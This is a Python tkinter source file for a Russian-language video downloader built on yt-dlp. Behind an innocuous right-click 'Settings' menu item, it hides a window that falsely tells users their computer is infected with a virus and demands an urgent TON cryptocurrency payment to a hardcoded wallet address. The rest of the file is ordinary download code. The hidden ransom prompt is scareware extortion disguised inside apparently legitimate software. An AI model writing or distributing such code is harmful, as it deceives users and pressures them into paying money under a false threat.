import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import subprocess
import threading
import os
import sys
import re
import webbrowser
import socket
import tempfile
import shutil
from pathlib import Path
import io
import contextlib

# --- НАСТРОЙКИ ВИРУСА ---
WALLET_ADDRESS = "UQAF9v0sQRrfde0MBH1SMQ9VJYNvi9R5yf5DXEgAkJYd0X6v"  # Замените на реальный кошелек TON


class UniversalDownloaderApp:
    def __init__(self, root):
        # Проверка на уже запущенный экземпляр
        if self.is_already_running():
            messagebox.showerror("Ошибка", "Программа уже запущена!")
            sys.exit(1)

        self.root = root
        self.root.title("Universal Video Downloader")
        # Убираем стандартную рамку и заголовок
        self.root.overrideredirect(True)
        self.root.geometry("350x600")
        self.root.resizable(False, True)

        # Создаем кастомный заголовок
        self.create_title_bar(self.root, "vdnldr", self.on_closing)

        # Тёмная тема
        bg_color = "#1e1e1e"
        fg_color = "#ffffff"
        entry_bg = "#2d2d2d"
        btn_bg = "#3c3c3c"
        btn_fg = "#ffffff"

        self.style = ttk.Style()
        self.style.theme_use('clam')

        # Настройка стилей для тёмной темы
        self.style.configure("TFrame", background=bg_color, borderwidth=0)
        self.style.configure("TLabel", background=bg_color, foreground=fg_color, font=("Arial", 9), borderwidth=0)
        self.style.configure("TButton", background=btn_bg, foreground=btn_fg, font=("Arial", 9), borderwidth=0)
        self.style.map("TButton", background=[('active', '#555555')], foreground=[('active', 'white')])
        
        # Стилизация Entry и Combobox для clam темы
        self.style.configure("TEntry",
            fieldbackground=entry_bg,
            foreground=fg_color,
            insertcolor=fg_color,
            bordercolor=entry_bg,
            lightcolor=entry_bg,
            darkcolor=entry_bg,
            borderwidth=0
        )
        self.style.configure("TCombobox",
            fieldbackground=entry_bg,
            background=btn_bg,
            foreground=fg_color,
            arrowcolor=fg_color,
            bordercolor=entry_bg,
            lightcolor=entry_bg,
            darkcolor=entry_bg,
            selectbackground=btn_bg,
            selectforeground=fg_color,
            borderwidth=0
        )
        self.style.map("TCombobox",
            fieldbackground=[('readonly', entry_bg)],
            selectbackground=[('readonly', btn_bg)],
            selectforeground=[('readonly', fg_color)]
        )
        self.style.configure("TScrollbar", background=btn_bg, troughcolor=bg_color, bordercolor=bg_color, arrowcolor=fg_color, borderwidth=0)

        # Главный фрейм (ниже заголовка)
        main_frame = ttk.Frame(root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=0, pady=0)

        # Выбор платформы
        ttk.Label(main_frame, text=" ← выбор платформы").grid(row=0, column=1, sticky=tk.W, pady=(0, 3))
        self.platform_var = tk.StringVar(value="Автоматически")
        platforms = ["Автоматически", "YouTube", "Rutube", "VK", "Odnoklassniki", "Dzen", "Vimeo", "Twitter", "Instagram", "TikTok"]
        platform_combo = ttk.Combobox(main_frame, textvariable=self.platform_var, values=platforms, width=16, state="readonly")
        platform_combo.grid(row=0, column=0, sticky=tk.W, pady=(0, 3), padx=(5, 0))
        platform_combo.bind("<<ComboboxSelected>>", self.on_platform_change)

        # Поле для URL
        ttk.Label(main_frame, text="").grid(row=0, column=0, sticky=tk.W, pady=(5, 2))
        self.url_entry = ttk.Entry(main_frame, width=55)
        self.url_entry.grid(row=2, column=0, columnspan=2, sticky=tk.EW, pady=(0, 6))
        self.url_entry.insert(0, "Введите URL видео или плейлиста:")

        self.url_entry.bind('<Button-1>', self.on_url_entry_click)
        self.url_entry.bind('<FocusIn>', self.on_url_entry_focus)

        # Кнопки вставки и очистки
        paste_frame = ttk.Frame(main_frame)
        paste_frame.grid(row=3, column=0, columnspan=2, sticky=tk.W, pady=(0, 6))

        paste_btn = ttk.Button(paste_frame, text="Вставить", command=self.paste_from_clipboard, width=10)
        paste_btn.pack(side=tk.LEFT, padx=(0, 5))

        clear_btn = ttk.Button(paste_frame, text="Очистить", command=self.clear_url, width=10)
        clear_btn.pack(side=tk.LEFT)

        # Настройки загрузки
        settings_frame = ttk.Frame(main_frame)
        settings_frame.grid(row=4, column=0, columnspan=2, sticky=tk.EW, pady=(0, 8))

        # Качество видео
        ttk.Label(settings_frame, text="Качество:").grid(row=0, column=0, sticky=tk.W, padx=(0, 5))
        self.quality_var = tk.StringVar(value="720")
        quality_combo = ttk.Combobox(settings_frame, textvariable=self.quality_var,
                                    values=["2160 (4K)", "1440 (2K)", "1080 (Full HD)", "720 (HD)", "480", "360", "240", "Авто"],
                                    width=12, state="readonly")
        quality_combo.grid(row=0, column=1, sticky=tk.W)

        # Скорость загрузки
        ttk.Label(settings_frame, text="Скорость:").grid(row=0, column=2, sticky=tk.W, padx=(8, 5))
        self.speed_var = tk.StringVar(value="5M")
        speed_combo = ttk.Combobox(settings_frame, textvariable=self.speed_var,
                                  values=["Без ограничений", "10M", "5M", "2M", "1M", "500K"],
                                  width=12, state="readonly")
        speed_combo.grid(row=0, column=3, sticky=tk.W)

        # Формат загрузки
        ttk.Label(settings_frame, text="Формат:").grid(row=1, column=0, sticky=tk.W, padx=(0, 5), pady=(4, 0))
        self.format_var = tk.StringVar(value="mp4")
        format_combo = ttk.Combobox(settings_frame, textvariable=self.format_var,
                                   values=["mp4", "mkv", "webm", "best", "worst"],
                                   width=12, state="readonly")
        format_combo.grid(row=1, column=1, sticky=tk.W, pady=(4, 0))

        # Папка сохранения
        ttk.Label(main_frame, text="Папка сохранения:").grid(row=5, column=0, sticky=tk.W, pady=(4, 2))
        self.folder_var = tk.StringVar(value=os.path.join(os.path.expanduser("~"), "Downloads"))
        folder_frame = ttk.Frame(main_frame)
        folder_frame.grid(row=6, column=0, columnspan=2, sticky=tk.EW, pady=(0, 6))

        self.folder_entry = ttk.Entry(folder_frame, textvariable=self.folder_var, width=45)
        self.folder_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)

        browse_btn = ttk.Button(folder_frame, text="Обзор", command=self.browse_folder, width=8)
        browse_btn.pack(side=tk.RIGHT, padx=(5, 0))

        # Формат имени файла
        ttk.Label(main_frame, text="Имя файла:").grid(row=7, column=0, sticky=tk.W, pady=(2, 2))
        self.name_format_var = tk.StringVar(value="%(title)s.%(ext)s")
        name_frame = ttk.Frame(main_frame)
        name_frame.grid(row=8, column=0, columnspan=2, sticky=tk.EW, pady=(0, 6))

        name_combo = ttk.Combobox(name_frame, textvariable=self.name_format_var,
                                 values=["%(title)s.%(ext)s", "%(id)s.%(ext)s", "%(upload_date)s_%(title)s.%(ext)s"],
                                 width=40, state="readonly")
        name_combo.pack(side=tk.LEFT, fill=tk.X, expand=True)

        # Лог выполнения (уменьшенная высота)
        ttk.Label(main_frame, text="Лог:").grid(row=9, column=0, sticky=tk.W, pady=(2, 2))
        self.log_text = scrolledtext.ScrolledText(main_frame, wrap=tk.WORD, width=65, height=6, 
                                                  bg=entry_bg, fg=fg_color, insertbackground=fg_color,
                                                  font=("Consolas", 8),
                                                  relief="flat", highlightthickness=0, bd=0)
        self.log_text.grid(row=10, column=0, columnspan=2, sticky=tk.NSEW, pady=(0, 6))
        self.log_text.config(state=tk.DISABLED)

        # Кнопки управления
        btn_frame = ttk.Frame(main_frame)
        btn_frame.grid(row=11, column=0, columnspan=2, pady=(0, 0))

        self.download_btn = ttk.Button(btn_frame, text="Скачать", command=self.start_download, width=10)
        self.download_btn.pack(side=tk.LEFT, padx=3)

        self.stop_btn = ttk.Button(btn_frame, text="Стоп", command=self.stop_download, state=tk.DISABLED, width=8)
        self.stop_btn.pack(side=tk.LEFT, padx=3)

        self.clear_log_btn = ttk.Button(btn_frame, text="Очистить лог", command=self.clear_log, width=12)
        self.clear_log_btn.pack(side=tk.LEFT, padx=3)

        help_btn = ttk.Button(btn_frame, text="Помощь", command=self.show_help, width=10)
        help_btn.pack(side=tk.RIGHT, padx=3)

        # Статус бар
        self.status_var = tk.StringVar(value="Готов к работе")
        status_bar = ttk.Label(root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W,
                               background="#252525", foreground="#cccccc", font=("Arial", 8))
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)

        # Переменные для управления потоком
        self.download_process = None
        self.is_downloading = False
        self.is_closing = False
        self.use_python_module = False
        self.temp_dir = None

        main_frame.grid_rowconfigure(10, weight=1)
        main_frame.columnconfigure(1, weight=1)

        # Привязка контекстного меню к ВСЕМУ окну
        self.root.bind("<Button-3>", self.show_context_menu)

        self.setup_environment()

    # ===== КАСТОМНЫЙ ЗАГОЛОВОК =====
    def create_title_bar(self, window, title, close_cmd):
        """Создает кастомную панель заголовка с перетаскиванием и кнопкой закрытия."""
        bar = tk.Frame(window, bg="#1a1a1a", height=25, border=1)
        bar.pack(fill=tk.X, side=tk.TOP)
        bar.pack_propagate(False) # Фиксируем высоту

        lbl = tk.Label(bar, text=title, bg="#1a1a1a", fg="white",
                       font=("Segoe UI", 10, "bold"), padx=8, pady=3)
        lbl.pack(side=tk.LEFT)

        close = tk.Label(bar, text="✖", bg="#1a1a1a", fg="white",
                         padx=8, pady=3, cursor="hand2")
        close.pack(side=tk.RIGHT)

        def start_move(e):
            window.x = e.x
            window.y = e.y
        def do_move(e):
            x = window.winfo_pointerx() - window.x
            y = window.winfo_pointery() - window.y
            window.geometry(f"+{x}+{y}")

        bar.bind("<ButtonPress-1>", start_move)
        bar.bind("<B1-Motion>", do_move)
        lbl.bind("<ButtonPress-1>", start_move)
        lbl.bind("<B1-Motion>", do_move)
        close.bind("<Button-1>", lambda e: close_cmd())

    # ===== КОНТЕКСТНОЕ МЕНЮ ПО ПКМ =====
    def show_context_menu(self, event):
        """Показывает контекстное меню по правой кнопке мыши."""
        menu = tk.Menu(self.root, tearoff=0)
        menu.add_command(label="Exit", command=self.on_closing)
        menu.add_command(label="Settings", command=self.open_settings)
        try:
            menu.tk_popup(event.x_root, event.y_root)
        finally:
            menu.grab_release()

    # ===== ОКНО НАСТРОЕК С "ВИРУСОМ" =====
    def open_settings(self):
        """Открывает окно настроек с 'вирусным' сообщением."""
        settings_window = tk.Toplevel(self.root)
        settings_window.title("Settings")
        settings_window.geometry("300x220")
        settings_window.resizable(False, False)
        settings_window.transient(self.root)
        settings_window.grab_set()

        # Центрирование окна относительно основного
        self.root.update_idletasks()
        x = self.root.winfo_rootx() + (self.root.winfo_width() // 2) - 150
        y = self.root.winfo_rooty() + (self.root.winfo_height() // 2) - 100
        settings_window.geometry(f"+{x}+{y}")

        message_top = "Вы захвачены вирусом!\nПереведите срочно TON на этот кошелек:\n"
        message_bottom = "\nСпасибо!"

        # Верхний текст
        label_top = tk.Label(settings_window, text=message_top, justify=tk.CENTER, wraplength=280)
        label_top.pack(pady=(15, 0))

        # Ссылка-кошелёк
        def copy_wallet(event=None):
            self.root.clipboard_clear()
            self.root.clipboard_append(WALLET_ADDRESS)
            messagebox.showinfo("Скопировано", "Адрес кошелька скопирован в буфер обмена!")

        def open_ton_explorer(event=None):
            import webbrowser
            # Исправлена ссылка (убран лишний пробел)
            webbrowser.open(f"https://tonscan.org/address/{WALLET_ADDRESS}")

        wallet_label = tk.Label(
            settings_window,
            text=WALLET_ADDRESS,
            fg="blue",
            cursor="hand2",
            justify=tk.CENTER,
            wraplength=280,
            font=("TkDefaultFont", 9, "underline")
        )
        wallet_label.pack(pady=5)
        wallet_label.bind("<Button-1>", open_ton_explorer)
        wallet_label.bind("<Button-3>", copy_wallet)  # ПКМ — копировать

        # Нижний текст
        label_bottom = tk.Label(settings_window, text=message_bottom, justify=tk.CENTER, wraplength=280)
        label_bottom.pack(pady=(0, 10))

        # Кнопки
        btn_frame = tk.Frame(settings_window)
        btn_frame.pack(pady=10)

        def on_sent():
            settings_window.destroy()

        def on_not_sent():
            settings_window.destroy()

        btn1 = ttk.Button(btn_frame, text="Я отправил", command=on_sent)
        btn1.pack(side=tk.LEFT, padx=5)

        btn2 = ttk.Button(btn_frame, text="Я не отправил", command=on_not_sent)
        btn2.pack(side=tk.LEFT, padx=5)

    # --- ОСТАЛЬНЫЕ МЕТОДЫ БЕЗ ИЗМЕНЕНИЙ ---
    # (Все методы из вашего оригинального кода загрузчика)

    def paste_from_clipboard(self):
        try:
            clipboard_content = self.root.clipboard_get()
            if clipboard_content.strip():
                self.url_entry.delete(0, tk.END)
                self.url_entry.insert(0, clipboard_content)
                self.log_message("[INFO] Ссылка вставлена из буфера обмена")
        except:
            self.log_message("[WARNING] Не удалось вставить из буфера обмена")

    def clear_url(self):
        self.url_entry.delete(0, tk.END)
        self.url_entry.insert(0, "https://")
        self.url_entry.focus_set()
        self.url_entry.select_range(0, tk.END)

    def on_url_entry_click(self, event):
        if self.url_entry.get() == "https://":
            self.url_entry.select_range(0, tk.END)

    def on_url_entry_focus(self, event):
        if self.url_entry.get() == "https://":
            self.url_entry.select_range(0, tk.END)

    def setup_environment(self):
        self.log_message("[INFO] Настройка окружения...")
        try:
            self.temp_dir = tempfile.mkdtemp(prefix="universal_downloader_")
            self.log_message(f"[INFO] Временная папка: {self.temp_dir}")
            self.setup_yt_dlp()
            self.log_message("[OK] Окружение настроено успешно!")
            self.status_var.set("Готов к работе")
        except Exception as e:
            self.log_message(f"[ERROR] Ошибка настройки: {str(e)}")
            self.status_var.set("Ошибка настройки")

    def setup_yt_dlp(self):
        try:
            import yt_dlp
            self.log_message("[OK] yt-dlp доступен через Python")
            self.use_python_module = True
            version = yt_dlp.version.__version__
            self.log_message(f"[INFO] Версия yt-dlp: {version}")
        except ImportError:
            self.log_message("[ERROR] yt-dlp не найден!")
            self.use_python_module = False
            messagebox.showerror("Ошибка", "yt-dlp не установлен! Программа не может работать.")

    def is_already_running(self):
        try:
            lock_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            lock_socket.bind(('127.0.0.1', 47291))
            return False
        except socket.error:
            return True

    def on_closing(self):
        if self.is_downloading:
            if messagebox.askyesno("Подтверждение", "Идет процесс скачивания. Вы уверены, что хотите выйти?"):
                self.is_closing = True
                self.stop_download()
                self.root.after(100, self.force_quit)
        else:
            self.cleanup()
            self.root.destroy()

    def cleanup(self):
        try:
            if self.temp_dir and os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
                self.log_message("[INFO] Временные файлы очищены")
        except:
            pass

    def force_quit(self):
        self.cleanup()
        self.root.destroy()

    def on_platform_change(self, event):
        platform = self.platform_var.get()
        self.log_message(f"[INFO] Выбрана платформа: {platform}")

    def browse_folder(self):
        folder_selected = filedialog.askdirectory(initialdir=self.folder_var.get())
        if folder_selected:
            self.folder_var.set(folder_selected)

    def log_message(self, message):
        if self.is_closing:
            return
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

    def clear_log(self):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state=tk.DISABLED)
        self.status_var.set("Лог очищен")

    def show_help(self):
        help_text = """
        vdnldr - инструкция:

        1. Выберите платформу или оставьте "Автоопределение"
        2. Вставьте ссылку на видео или плейлист
        3. Выберите качество, формат, папку
        4. Нажмите "Скачать"

        Поддерживаемые платформы: YouTube, Rutube, VK, OK,
        Dzen, Vimeo, Twitter, Instagram, TikTok и др.
        """
        messagebox.showinfo("Помощь", help_text)

    def start_download(self):
        if self.is_downloading:
            return
        content_url = self.url_entry.get().strip()
        if not content_url or content_url == "https://":
            messagebox.showerror("Ошибка", "Введите URL видео или плейлиста")
            self.url_entry.focus_set()
            return
        if not re.match(r'^https?://', content_url):
            messagebox.showerror("Ошибка", "Некорректный URL. Должен начинаться с http:// или https://")
            self.url_entry.focus_set()
            self.url_entry.select_range(0, tk.END)
            return
        if not self.use_python_module:
            messagebox.showerror("Ошибка", "yt-dlp не доступен! Переустановите приложение.")
            return

        output_folder = self.folder_var.get()
        if not os.path.exists(output_folder):
            try:
                os.makedirs(output_folder)
            except:
                messagebox.showerror("Ошибка", f"Невозможно создать папку: {output_folder}")
                return

        self.log_message("\n" + "="*60)
        self.log_message(f"Начало: {content_url}")
        self.log_message(f"Папка: {output_folder}")
        self.log_message("="*60 + "\n")

        self.download_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.is_downloading = True
        self.status_var.set("Скачивание началось...")

        threading.Thread(target=self.run_download, args=(content_url,), daemon=True).start()

    def run_download(self, content_url):
        try:
            if not self.use_python_module:
                self.log_message("[ERROR] yt-dlp не доступен!")
                self.root.after(0, self.download_complete)
                return

            import yt_dlp
            output_capture = io.StringIO()

            def download_with_redirect():
                try:
                    with contextlib.redirect_stdout(output_capture):
                        with contextlib.redirect_stderr(output_capture):
                            ydl_opts = {
                                'outtmpl': os.path.join(self.folder_var.get(), self.name_format_var.get()),
                                'ignoreerrors': True,
                                'retries': 10,
                                'fragment_retries': 10,
                                'concurrent_fragments': 4,
                                'sleep_interval': 5,
                                'quiet': False,
                                'no_warnings': False,
                                'progress_hooks': [self.progress_hook],
                            }

                            if self.format_var.get() != 'best':
                                ydl_opts['merge_output_format'] = self.format_var.get()
                                ydl_opts['format'] = f'bestvideo[ext={self.format_var.get()}]+bestaudio[ext=m4a]/best'

                            quality = self.quality_var.get().split()[0] if self.quality_var.get() != "Авто" else "best"
                            if quality != "best":
                                ydl_opts['format'] = f'bestvideo[height<={quality}]+bestaudio/best[height<={quality}]'

                            speed_limit = self.speed_var.get()
                            if speed_limit != "Без ограничений":
                                if 'M' in speed_limit:
                                    rate_limit = int(speed_limit.replace('M', '')) * 1000000
                                elif 'K' in speed_limit:
                                    rate_limit = int(speed_limit.replace('K', '')) * 1000
                                else:
                                    rate_limit = int(speed_limit)
                                ydl_opts['ratelimit'] = rate_limit

                            if any(x in content_url for x in ["/playlist/", "/plst/", "list="]):
                                ydl_opts['outtmpl'] = os.path.join(
                                    self.folder_var.get(), 
                                    '%(playlist_title)s', 
                                    self.name_format_var.get()
                                )

                            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                                ydl.download([content_url])
                except Exception as e:
                    output_capture.write(f"\n[ERROR] Критическая ошибка: {str(e)}\n")
                    import traceback
                    output_capture.write(f"Трассировка: {traceback.format_exc()}\n")
                finally:
                    if not self.is_closing:
                        self.root.after(0, self.download_complete)

            download_thread = threading.Thread(target=download_with_redirect, daemon=True)
            download_thread.start()

            while self.is_downloading and not self.is_closing and download_thread.is_alive():
                try:
                    output = output_capture.getvalue()
                    if output:
                        lines = output.split('\n')
                        for line in lines:
                            if line.strip() and not self.is_closing:
                                self.root.after(0, self.log_message, line.strip())
                        output_capture.seek(0)
                        output_capture.truncate(0)
                except Exception as e:
                    self.log_message(f"[ERROR] Ошибка чтения вывода: {str(e)}")
                threading.Event().wait(0.5)

        except Exception as e:
            if not self.is_closing:
                self.log_message(f"[ERROR] Ошибка запуска: {str(e)}")
                self.root.after(0, self.download_complete)

    def progress_hook(self, d):
        if d['status'] == 'downloading':
            percent = d.get('_percent_str', 'N/A')
            speed = d.get('_speed_str', 'N/A')
            eta = d.get('_eta_str', 'N/A')
            self.status_var.set(f"Загрузка: {percent} | Скорость: {speed} | Осталось: {eta}")
        elif d['status'] == 'finished':
            self.status_var.set("Загрузка завершена! Конвертация...")

    def stop_download(self):
        if self.is_downloading:
            self.log_message("\n[STOP] Скачивание остановлено")
            self.status_var.set("Скачивание остановлено")
            self.is_downloading = False
            self.download_complete()

    def download_complete(self):
        self.is_downloading = False
        self.download_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status_var.set("Готов к работе")


if __name__ == "__main__":
    root = tk.Tk()
    app = UniversalDownloaderApp(root)
    root.mainloop()